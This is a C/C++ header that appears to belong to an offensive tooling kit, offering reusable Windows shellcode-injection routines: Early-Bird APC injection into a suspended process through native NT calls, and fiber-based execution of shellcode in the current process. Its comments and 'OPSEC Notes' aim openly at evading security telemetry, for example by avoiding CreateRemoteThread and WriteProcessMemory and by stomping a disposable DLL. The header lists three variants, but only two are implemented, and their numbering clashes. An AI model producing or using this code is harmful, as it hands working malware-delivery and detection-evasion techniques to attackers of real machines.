/*
 * Threadless Injection Template — Relay-kit Reference
 * Technique: Hijack an existing thread's execution via APC, fiber, or return-oriented trampoline
 *            without creating a new remote thread (avoids CreateRemoteThread telemetry).
 *
 * Variants covered:
 *   1. Early-Bird APC Injection (NtQueueApcThread on newly created suspended process)
 *   2. Module Stomping + Threadless shellcode delivery via NtMapViewOfSection
 *   3. Fiber-based local payload execution (no remote thread, no suspicious cross-process writes)
 *
 * Windows 10/11 x64 compatible.
 */

#pragma once
#include <Windows.h>
#include <winternl.h>

typedef NTSTATUS(NTAPI* NtQueueApcThreadFn)(HANDLE, PVOID, PVOID, PVOID, PVOID);
typedef NTSTATUS(NTAPI* NtAllocateVirtualMemoryFn)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI* NtWriteVirtualMemoryFn)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(NTAPI* NtProtectVirtualMemoryFn)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS(NTAPI* NtResumeThreadFn)(HANDLE, PULONG);

/*
 * VARIANT 1: Early-Bird APC Injection
 * ─────────────────────────────────────
 * 1. Create target process suspended (CREATE_SUSPENDED).
 * 2. Allocate RW memory in target.
 * 3. Write shellcode.
 * 4. Flip to RX.
 * 5. Queue APC to main thread pointing at shellcode.
 * 6. Resume thread → APC fires on first alertable wait.
 */
static BOOL EarlyBirdApcInject(const wchar_t* targetExePath, PBYTE shellcode, SIZE_T shellcodeSize) {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};
    if (!CreateProcessW(targetExePath, nullptr, nullptr, nullptr, FALSE,
                        CREATE_SUSPENDED, nullptr, nullptr, &si, &pi))
        return FALSE;

    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    auto NtAllocateVirtualMemory = (NtAllocateVirtualMemoryFn)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    auto NtWriteVirtualMemory    = (NtWriteVirtualMemoryFn)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    auto NtProtectVirtualMemory  = (NtProtectVirtualMemoryFn)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
    auto NtQueueApcThread        = (NtQueueApcThreadFn)GetProcAddress(hNtdll, "NtQueueApcThread");
    auto NtResumeThread          = (NtResumeThreadFn)GetProcAddress(hNtdll, "NtResumeThread");

    PVOID remoteBase = nullptr;
    SIZE_T regionSize = shellcodeSize;
    NtAllocateVirtualMemory(pi.hProcess, &remoteBase, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    SIZE_T written = 0;
    NtWriteVirtualMemory(pi.hProcess, remoteBase, shellcode, shellcodeSize, &written);

    ULONG oldProtect = 0;
    NtProtectVirtualMemory(pi.hProcess, &remoteBase, &regionSize, PAGE_EXECUTE_READ, &oldProtect);

    NtQueueApcThread(pi.hThread, (PVOID)remoteBase, nullptr, nullptr, nullptr);
    NtResumeThread(pi.hThread, nullptr);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return TRUE;
}

/*
 * VARIANT 2: Fiber-based Local Payload Execution
 * ────────────────────────────────────────────────
 * No cross-process handles, no remote thread, no suspicious kernel events.
 * Executes shellcode in current process context via fiber switch.
 */
static BOOL FiberLocalExecute(PBYTE shellcode, SIZE_T shellcodeSize) {
    /* Alloc RW, write, flip RX */
    PVOID mem = VirtualAlloc(nullptr, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return FALSE;
    memcpy(mem, shellcode, shellcodeSize);
    DWORD old;
    VirtualProtect(mem, shellcodeSize, PAGE_EXECUTE_READ, &old);

    /* Convert current thread to fiber, create shellcode fiber, switch */
    PVOID mainFiber = ConvertThreadToFiber(nullptr);
    PVOID scFiber   = CreateFiber(0, (LPFIBER_START_ROUTINE)mem, mainFiber);
    if (!scFiber) { VirtualFree(mem, 0, MEM_RELEASE); return FALSE; }

    SwitchToFiber(scFiber);   /* Shellcode runs; it should SwitchToFiber(mainFiber) to return */
    DeleteFiber(scFiber);
    return TRUE;
}

/*
 * OPSEC Notes:
 * - EarlyBird APC: Main thread must hit an alertable wait (SleepEx, WaitForSingleObjectEx).
 *   Most processes hit this early in NTDLL init — reliable for most targets.
 * - Avoid WriteProcessMemory API directly; use NtWriteVirtualMemory (less telemetry).
 * - After NtProtect to RX, zero the RW staging buffer if you allocated a separate one.
 * - Module Stomping variant: NtMapViewOfSection into target process over a disposable module
 *   (e.g., xpsservices.dll) to avoid VirtualAlloc telemetry. Extend here as needed.
 */
